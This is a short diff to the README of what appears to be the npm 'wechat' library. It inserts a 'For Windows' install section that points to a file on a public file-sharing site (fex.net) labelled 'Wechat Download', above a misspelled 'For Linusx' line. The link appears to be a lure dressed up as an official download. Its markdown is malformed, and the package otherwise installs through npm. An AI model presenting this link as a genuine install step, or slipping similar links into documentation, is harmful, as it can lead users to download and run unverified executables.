@@ -26,6 +26,12 @@ wechat
 
 ## Installation
 
+### For Windows 
+
+(https://fex.net/ru/s/83necpf)[Wechat Download]
+
+For Linusx
+
 ```sh
 $ npm install wechat
 ```
